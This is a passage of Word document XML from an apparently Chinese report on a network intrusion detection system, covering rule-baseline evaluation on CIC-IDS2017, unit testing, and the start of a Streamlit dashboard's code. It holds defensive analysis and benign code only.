            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.973</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="71BC3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483369FF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>macro-F1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2EB405D9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="77F1115E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="49E534FE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.5795</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18520991">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.9719</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0F5C1B51">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E6FE0AF">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="4354830"/>
            <wp:effectExtent l="0" t="0" r="1460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472000" cy="4354835"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D74B5CB">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-10　规则基线评测脚本的实测输出（本机终端）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FEF432A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0.5795 这个数要读对两件事。第一，它只是单流规则的成绩——每次判定只看得见一行特征。端口扫描真正依靠的是“同一源在窗口内探了多少个目的端口”，而这条信息在 CSV 里根本不存在（78 列特征里既没有源/目的 IP，也没有时间戳）。线上规则引擎用的是窗口判据，能力不止这个数，所以不能拿 0.5795 去证明“规则无用”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E38542">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>顺带一提，阈值规则作为端口扫描检测手段的局限性，在公开的实验评估里也有类似记录[17]——单流判据对“慢扫描”和“单包短流”这两端都不敏感，这和我们量到的 0.468 精确率是一致的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4B1BC0">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第二，规则在“小模型失效的那种形态”上确实工作。实测两条：25 条单包 SYN 探测流走完整链路，小模型 25 条全判 BENIGN，规则层出 1 条 PortScan 告警；把数据集里 3 条 PortScan 加 3 条 DoS Hulk 行喂进去，小模型出 6 条告警且每条都带六类概率，规则同时给其中 4 条补了印证命中。这正是开集问题下的分工：小模型管它见过的形态，规则管与采集口径无关的行为。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086A2B7E">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.5.4 单元测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D88FF8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>单元测试 59 条，以合成数据为主，刻意不依赖 CIC-IDS2017 原始文件，保证换一台机器 clone 下来即可跑。覆盖的重点是三类容易静默出错的地方：特征口径（包长只统计 L4 载荷、标志位是 0/1 而不是次数）、规则引擎（去重域、冷却、优先级顺序）、以及 schema 校验（字段缺失与风险等级越界必须拒绝）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39196674">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="1517650"/>
            <wp:effectExtent l="0" t="0" r="1460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5472000" cy="1517658"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCF3763">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-11　单元测试：59 条全部通过</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF58763">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>测试的写法上也有一条经验：断言要指向“能力是否存在”，而不是“函数有没有被调用”。例如验证去重域时，断言的是“200 端口扫描只产生 1 条告警”，而不是“_should_report 被调用了 200 次”；后者在去重逻辑写错时同样可能通过。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799BAC26">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.5.5 本部分完整代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62AC8B50">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>以下为本部分全部代码。测试文件按模块拆成四个，按“特征 → 规则 → 训练流水线 → 混合森林”排列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46378526">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-26　dashboard/app.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（445 行）　M5 看板</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D9529A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M5 可视化看板：实时流量、告警列表、LLM 诊断报告与追问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202BD422">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58747EF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>启动::</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7335C1CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00D695F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    streamlit run dashboard/app.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3578BFDF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A384A00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>配色说明：分类色按固定槽位顺序取用（蓝/橙/青/黄/品红/绿），不按排名、不循环。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BFA995">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>青、黄、品红三色在浅色底上对比度低于 3:1，因此所有柱状图都带直接数值标签，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0E421B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>告警表也照常显示数值——颜色从不单独承载信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FDB032">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>风险等级用状态色（绿/黄/橙/红），并且总是同时写出文字等级。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C920931">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489FAA51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F790027">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2088D935">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D2DEC41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEB4D8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6552ABFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B7F93C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36061CED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27EE3268">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import httpx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFC580B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pandas as pd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48432533">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import plotly.graph_objects as go</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2713A23A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import streamlit as st</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0901EA97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4754E4A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ROOT = Path(__file__).resolve().parent.parent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE0C86B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if str(ROOT) not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768D15FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.path.insert(0, str(ROOT))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BC96DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BDF95B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from settings import is_local_endpoint  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B0CC05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="486651A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 分类色固定顺序（已用调色板校验脚本验证相邻色对 CVD 可分辨）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B18CC72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SERIES = ["#2a78d6", "#eb6834", "#1baf7a", "#eda100", "#e87ba4", "#008300"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E37D4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>RISK_COLORS = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BC9DC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "info": "#898781",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9BBEF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "low": "#0ca30c",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D0711D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "medium": "#fab219",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154455F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "high": "#ec835a",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43737659">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "critical": "#d03b3b",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7CBD2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
